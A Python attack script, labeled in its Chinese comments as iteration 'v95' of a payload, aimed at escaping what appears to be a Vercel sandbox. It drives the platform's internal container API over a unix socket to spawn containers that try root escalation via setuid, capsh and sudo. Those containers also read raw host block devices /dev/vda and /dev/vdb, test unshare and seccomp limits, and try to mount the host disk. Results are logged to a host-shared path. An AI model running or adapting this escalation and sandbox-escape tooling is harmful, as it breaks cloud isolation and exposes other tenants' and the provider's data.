# -*- coding: utf-8 -*-
"""v95 payload: drive 容器内提权 + 块设备/宿主盘验证
v94 发现: 完整 root 能力集(ambient, cap_setuid/cap_sys_admin/cap_mknod), no-new-privs=0,
          sudo/su setuid, /dev/vdb=容器根, /dev/vda=/etc 挂载(ro xfs)
v95: A setuid(0)/sudo 提权  B 块设备列表  C 宿主盘读取  D unshare/seccomp/mount
"""
import socket, time, os, json, re, struct, threading

OUT = '/vercel/sandbox/v95c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v95c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pvar(field_no, n):
    return pvarint((field_no << 3) | 0) + pvarint(n)


def rpc_raw(path, body=b'', ct='application/json', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ct, len(body)))
        s.sendall(req.encode() + body)
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', '', b''
        head, _, rest = data.partition(b'\r\n\r\n')
        lines = head.decode(errors='replace').split('\r\n')
        return lines[0], '\n'.join(lines[1:])[:100], rest
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, '', b''


def rpc(path, body='{}', t=3):
    st, hd, bd = rpc_raw(path, body.encode(), 'application/json', t)
    return st, bd[:600].decode(errors='replace')


def grpc_req(pl):
    return b'\x00' + struct.pack('>I', len(pl)) + pl


class Keep:
    """保持连接: 后台线程发请求并持续读, 1s 轮询 stop"""
    def __init__(self, path, body, t=20):
        self.path, self.body, self.t = path, body, t
        self.data = bytearray()
        self.done = threading.Event()
        self._stop = threading.Event()
        self._err = None
        self._t = threading.Thread(target=self._run)
        self._t.daemon = True

    def _run(self):
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect('/run/cell/cell.sock')
            req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/grpc\r\n'
                   'Content-Length: %d\r\nConnection: keep-alive\r\n\r\n' % (self.path, len(self.body)))
            s.sendall(req.encode() + self.body)
            deadline = time.time() + self.t
            while not self._stop.is_set() and time.time() < deadline:
                try:
                    chunk = s.recv(8192)
                except socket.timeout:
                    continue
                except OSError:
                    break
                if not chunk:
                    break
                self.data += chunk
            try:
                s.close()
            except Exception:
                pass
        except Exception as e:
            self._err = e
        self.done.set()

    def start(self):
        self._t.start()
        return self

    def stop(self):
        self._stop.set()

    def status(self):
        return 'done=%s err=%s data=%d' % (self.done.is_set(), self._err, len(self.data))


def extract_frames(d):
    """从 chunked HTTP body 提取 grpc 数据帧内容 (StreamOutputResponse.data 拼接)"""
    idx = d.find(b'\r\n\r\n')
    if idx >= 0:
        d = d[idx + 4:]
    out = b''
    while d:
        nl = d.find(b'\r\n')
        if nl < 0:
            break
        try:
            size = int(d[:nl], 16)
        except Exception:
            break
        if size == 0:
            break
        chunk = d[nl + 2:nl + 2 + size]
        if len(chunk) >= 5 and chunk[0] == 0:
            pl = chunk[5:]
            if pl.startswith(b'\x0a'):
                v = 0
                shift = 0
                i = 1
                while i < len(pl):
                    b = pl[i]
                    v |= (b & 0x7f) << shift
                    i += 1
                    if not (b & 0x80):
                        break
                    shift += 7
                out += pl[i:i + v]
        d = d[nl + 2 + size + 2:]
    return out


def main():
    log('V95 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'

    def create(body, tag):
        st, bd = rpc(CTR + '/Create', body, t=8)
        cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
        log('%s CREATE -> %s cid=%s' % (tag, st, cid or bd[:120]))
        return cid

    def run_cmd(tag, cmdline, wait=6):
        body = json.dumps({"drive_id": "sandbox", "command": "/bin/sh", "arguments": ["-c", cmdline]})
        cid = create(body, tag)
        if not cid:
            return
        k = Keep(CTR + '/StreamOutput', grpc_req(pstr(1, cid) + pvar(2, 1)), t=15).start()
        time.sleep(1.0)
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        log('%s started, waiting %ds' % (tag, wait))
        time.sleep(wait)
        d = bytes(k.data)
        txt = extract_frames(d).decode(errors='replace')
        log('%s SO %s rawlen=%d' % (tag, k.status(), len(d)))
        log('%s OUT<<<\n%s\n>>>' % (tag, txt[:3500]))
        k.stop()
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('%s killed' % tag)
        time.sleep(0.5)

    # A. 提权测试: setuid(0) + sudo
    run_cmd('A1', 'echo ===SETUID===; python3 -c "import os; os.setgid(0); os.setuid(0); '
                  'print(os.getuid(), os.getgid())" 2>&1; python3 -c "import os; os.setuid(0); os.system(\'id\')" 2>&1; '
                  'echo ===CAPSH===; capsh --uid=0 -- -c "id" 2>&1; '
                  'echo ===SUDO===; sudo -n id 2>&1; '
                  'echo ===SUDOTEST===; echo V95_SUDO_WORKS | sudo -S id 2>&1 | head -3')

    # B. 块设备列表
    run_cmd('B1', 'echo ===DEV===; ls -la /dev/vd* /dev/sd* /dev/xvd* 2>&1; echo ===PART===; '
                  'cat /proc/partitions 2>&1; echo ===DEVALL===; ls /dev/ 2>&1 | head -30; '
                  'echo ===VDA===; ls -la /dev/vda 2>&1')

    # C. 块设备读取 (vda/vdb 前几块)
    run_cmd('C1', 'echo ===VDA_READ===; python3 -c "import re; f=open(\'/dev/vda\',\'rb\'); d=f.read(8192); '
                  'print(\'len\', len(d)); print([x for x in re.findall(rb\'[\\x20-\\x7e]{6,}\', d)[:10]])" 2>&1; '
                  'echo ===VDB_READ===; python3 -c "import re; f=open(\'/dev/vdb\',\'rb\'); d=f.read(8192); '
                  'print(\'len\', len(d)); print([x for x in re.findall(rb\'[\\x20-\\x7e]{6,}\', d)[:10]])" 2>&1')

    # D. seccomp / unshare / mount
    run_cmd('D1', 'echo ===SEC===; grep -E "Seccomp|NoNewPrivs" /proc/self/status; '
                  'echo ===UNSHARE_M===; unshare -m true 2>&1; echo rc=$?; '
                  'echo ===UNSHARE_U===; unshare -U true 2>&1; echo rc=$?; '
                  'echo ===UNSHARE_N===; unshare -n true 2>&1; echo rc=$?; '
                  'echo ===MOUNT_TRY===; mkdir -p /tmp/v95mnt 2>&1; '
                  'mount -t xfs -o ro /dev/vda /tmp/v95mnt 2>&1; echo rc=$?; '
                  'ls /tmp/v95mnt 2>&1 | head -10; umount /tmp/v95mnt 2>/dev/null')

    log('V95C_DONE')


main()
